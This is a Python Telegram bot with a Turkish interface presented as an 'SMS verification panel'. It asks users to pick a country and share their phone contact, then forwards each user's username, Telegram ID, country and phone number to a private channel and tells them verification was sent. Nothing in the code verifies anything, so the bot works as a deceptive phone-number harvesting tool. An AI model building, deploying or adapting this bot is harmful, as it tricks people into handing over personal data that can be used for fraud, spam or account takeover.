import os
import random
from datetime import datetime
from zoneinfo import ZoneInfo
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, CallbackQueryHandler, filters

TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID","0"))
CHANNEL_ID = int(os.getenv("CHANNEL_ID","0"))
TZ = ZoneInfo("Europe/Istanbul")

countries = [
("🇹🇷 Türkiye","TR"),("🇩🇪 Almanya","DE"),("🇫🇷 Fransa","FR"),("🇬🇧 İngiltere","UK"),("🇳🇱 Hollanda","NL"),
("🇺🇸 Amerika","US"),("🇧🇷 Brezilya","BR"),("🇯🇵 Japonya","JP"),("🇮🇳 Hindistan","IN"),("🇦🇪 BAE","AE"),
("🇮🇹 İtalya","IT"),("🇪🇸 İspanya","ES"),("🇨🇦 Kanada","CA"),("🇸🇪 İsveç","SE"),("🇳🇴 Norveç","NO"),
("🇨🇭 İsviçre","CH"),("🇦🇺 Avustralya","AU"),("🇦🇹 Avusturya","AT"),("🇧🇪 Belçika","BE"),("🇵🇱 Polonya","PL")
]

waiting_country = {}

def saat():
    return datetime.now(TZ).strftime("%d.%m.%Y • %H:%M")

def panel(user):
    uname = f"@{user.username}" if user.username else user.first_name
    return f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        📲 SMS ONAY PANELİ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

╭──────────── KULLANICI ────────────╮
│ 👤 {uname}
│ 🆔 {user.id}
│ 🔐 Durum : Aktif
╰───────────────────────────────────╯

╭───────────── SİSTEM ─────────────╮
│ 🌍 Bölge : Türkiye
│ 🕒 Saat  : {saat()}
│ 🟢 Sunucu : Online
│ ⚙️ Sürüm : v4.0
╰───────────────────────────────────╯

Aşağıdan işlem seç 👇
"""

def menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✧ SMS ONAY ✧",callback_data="sms")],
        [InlineKeyboardButton("👑 Geliştirici",callback_data="dev"),InlineKeyboardButton("ℹ️ Bilgi",callback_data="info")]
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(panel(update.effective_user),reply_markup=menu())

async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    if q.data == "sms":
        selected = random.sample(countries,10)
        keyboard = [[InlineKeyboardButton(name,callback_data=f"country_{code}")] for name,code in selected]
        await q.edit_message_text("🌍 Ülke seç",reply_markup=InlineKeyboardMarkup(keyboard))

    elif q.data.startswith("country_"):
        code = q.data.split("_")[1]
        waiting_country[q.from_user.id]=code
        btn = [[KeyboardButton("📲 SMS ONAY",request_contact=True)]]
        await q.message.reply_text("SMS Onay için numaranı gönder",reply_markup=ReplyKeyboardMarkup(btn,resize_keyboard=True,one_time_keyboard=True))

    elif q.data=="dev":
        await q.edit_message_text("👑 Geliştirici: @tanrican")

    elif q.data=="info":
        await q.edit_message_text("Bu bot doğrulama paneli arayüzüdür")

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id not in waiting_country:
        return

    code = waiting_country[user.id]
    phone = update.message.contact.phone_number
    uname = f"@{user.username}" if user.username else user.first_name

    text=f"""
📥 YENİ SMS ONAY

👤 Kullanıcı: {uname}
🆔 ID: {user.id}
🌍 Ülke: {code}
📞 Numara: {phone}
🕒 Saat: {saat()}
"""

    await context.bot.send_message(chat_id=CHANNEL_ID,text=text)
    await update.message.reply_text("✅ SMS Onay Gönderildi")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        return
    uid=int(context.args[0])
    try:
        await context.bot.ban_chat_member(CHANNEL_ID,uid)
        await update.message.reply_text("Kullanıcı banlandı")
    except:
        await update.message.reply_text("Ban başarısız")

app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start",start))
app.add_handler(CommandHandler("ban",ban))
app.add_handler(CallbackQueryHandler(buttons))
app.add_handler(MessageHandler(filters.CONTACT,contact_handler))

print("BOT AKTİF")
app.run_polling()
